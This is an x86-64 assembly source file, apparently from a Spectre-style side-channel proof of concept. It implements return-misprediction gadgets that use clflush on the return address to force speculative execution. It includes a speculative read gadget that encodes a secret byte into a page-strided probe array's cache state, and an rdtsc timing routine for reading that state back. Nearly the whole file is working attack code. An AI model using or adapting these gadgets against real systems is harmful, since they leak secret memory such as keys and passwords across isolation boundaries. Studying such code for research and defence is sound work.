section .text
    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, spec_read_gadget, time_memory_load

add:
    mov rax, rdi
    add rax, rsi
    ret


spec_ret_gadget:
    call level_a
    jmp end
level_a:
    call mispredict_return
    ; speculative code goes here
    ; mov rax, qword [rdi]
    ; mov rax, qword [rdi]
    mov rax, qword [rdi]
mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
end:
    ret

spec_ret_gadget_burst:
    call burst_level_a
    jmp burst_end
burst_level_a:
    call burst_mispredict_return
    ; Touch several lines in the target page to amplify the page-local footprint.
    mov rax, qword [rdi + 0]
    mov rax, qword [rdi + 64]
    mov rax, qword [rdi + 128]
    mov rax, qword [rdi + 192]
    mov rax, qword [rdi + 256]
    mov rax, qword [rdi + 320]
    mov rax, qword [rdi + 384]
    mov rax, qword [rdi + 448]
burst_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
burst_end:
    ret

spec_ret_store_gadget:
    call store_level_a
    jmp store_end
store_level_a:
    call store_mispredict_return
    mov qword [rdi], 42
    ; mov rax, qword [rdi]
store_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
store_end:
    ret

; void spec_read_gadget(void *secret, void *probe_array)
; rdi = address of secret byte
; rsi = probe array base (must be NUM_BYTE_SLOTS * PAGE_SIZE bytes)
; Speculatively loads secret byte and uses its value to index into probe_array,
; encoding the byte value into the cache as a side channel.
spec_read_gadget:
    call read_level_a
    jmp read_end
read_level_a:
    call read_mispredict_return
    movzx rax, byte [rdi]       ; speculatively load secret byte
    shl rax, 12                 ; rax *= PAGE_SIZE (4096 = 2^12)
    add rax, rsi                ; rax = &probe_array[secret_byte * PAGE_SIZE]
    mov rcx, [rax]              ; bring that cache line in
    lfence
read_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
read_end:
    ret

time_memory_load:
    lfence
    rdtsc
    mov rsi, rax
    mov rcx, [rdi]
    lfence
    rdtsc
    sub rax, rsi
    ret
